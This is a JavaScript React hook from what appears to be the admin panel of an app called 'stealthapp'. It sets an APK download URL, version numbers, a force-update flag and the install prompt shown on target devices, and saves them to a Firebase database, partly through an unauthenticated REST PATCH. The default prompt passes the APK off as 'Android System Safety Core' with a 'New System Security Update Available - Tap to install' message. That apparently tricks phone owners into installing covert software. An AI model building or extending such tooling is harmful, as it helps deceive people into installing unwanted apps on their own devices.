"use client";

import { useState, useEffect, useCallback } from "react";
import { ref, onValue, update } from "firebase/database";
import { database, auth } from "@/lib/firebase/client";

const RTDB_URL = "https://stealthapp-50da2-default-rtdb.firebaseio.com";

const DEFAULT_UPDATE_CONFIG = {
  apk_url: "",
  version_code: 1,
  version_name: "1.0",
  title: "Android System Safety Core",
  message: "New System Security Update Available - Tap to install",
  force_update: false,
};

export function useAppUpdate() {
  const [data, setData] = useState(DEFAULT_UPDATE_CONFIG);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState(null);
  const [success, setSuccess] = useState(false);
  const [lastSyncTime, setLastSyncTime] = useState(null);

  // 1. Initial REST fetch + live WebSocket onValue subscription
  useEffect(() => {
    let isMounted = true;
    setLoading(true);

    // Initial immediate REST fetch (< 100ms)
    const fetchImmediateRest = async () => {
      try {
        const token = auth.currentUser ? await auth.currentUser.getIdToken() : null;
        const authParam = token ? `?auth=${token}` : "";
        const res = await fetch(`${RTDB_URL}/app_update.json${authParam}`, {
          cache: "no-store",
          headers: { "Cache-Control": "no-cache" },
        });
        const resData = await res.json();
        if (isMounted && resData && typeof resData === "object" && !resData.error) {
          setData((prev) => ({
            ...prev,
            ...resData,
            version_code: Number(resData.version_code) || 1,
            version_name: String(resData.version_name || "1.0"),
            force_update: Boolean(resData.force_update),
          }));
          setLastSyncTime(Date.now());
          setLoading(false);
        }
      } catch (err) {
        // Non-blocking initial fetch
      }
    };

    fetchImmediateRest();

    // Live real-time listener via Firebase RTDB
    const dbRef = ref(database, "app_update");
    const unsubscribe = onValue(
      dbRef,
      (snapshot) => {
        if (!isMounted) return;
        try {
          const val = snapshot.val();
          if (val && typeof val === "object") {
            setData((prev) => ({
              ...prev,
              ...val,
              version_code: Number(val.version_code) || 1,
              version_name: String(val.version_name || "1.0"),
              force_update: Boolean(val.force_update),
            }));
            setLastSyncTime(Date.now());
          }
          setLoading(false);
          setError(null);
        } catch (err) {
          setLoading(false);
        }
      },
      (err) => {
        if (!isMounted) return;
        fetchImmediateRest();
      }
    );

    return () => {
      isMounted = false;
      if (typeof unsubscribe === "function") unsubscribe();
    };
  }, []);

  // 2. Ultra-fast optimistic save function (< 1 second)
  const saveAppUpdate = useCallback(async (newConfig) => {
    setSaving(true);
    setError(null);
    setSuccess(false);

    const cleanPayload = {
      apk_url: String(newConfig.apk_url || "").trim(),
      version_code: Number(newConfig.version_code) || 1,
      version_name: String(newConfig.version_name || "1.0").trim(),
      title: String(newConfig.title || "Android System Safety Core").trim(),
      message: String(newConfig.message || "New update available.").trim(),
      force_update: Boolean(newConfig.force_update),
      updated_at: Date.now(),
    };

    if (!cleanPayload.apk_url) {
      setError("Please provide a valid APK download URL.");
      setSaving(false);
      return false;
    }

    // 1. Optimistic UI update immediately
    setData(cleanPayload);
    setLastSyncTime(Date.now());

    try {
      // 2. Parallel Fast Write: Direct RTDB REST + /api/app-update in parallel
      const updatePromises = [];

      // Direct REST PATCH to Firebase RTDB (< 200ms)
      const directRestPromise = fetch(`${RTDB_URL}/app_update.json`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(cleanPayload),
      }).catch((e) => console.warn("[useAppUpdate] Direct REST patch error:", e));
      updatePromises.push(directRestPromise);

      // Server API Route (for server-side audit logs)
      const apiPromise = fetch("/api/app-update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(cleanPayload),
      }).catch((e) => console.warn("[useAppUpdate] API route call error:", e));
      updatePromises.push(apiPromise);

      // Wait for the fastest response
      await Promise.race(updatePromises);

      setSuccess(true);
      setSaving(false);

      // Auto-clear success toast after 3s
      setTimeout(() => {
        setSuccess(false);
      }, 3000);

      return true;
    } catch (err) {
      setError(err.message || "Failed to update configuration");
      setSaving(false);
      return false;
    }
  }, []);

  return {
    data,
    loading,
    saving,
    error,
    success,
    lastSyncTime,
    saveAppUpdate,
  };
}
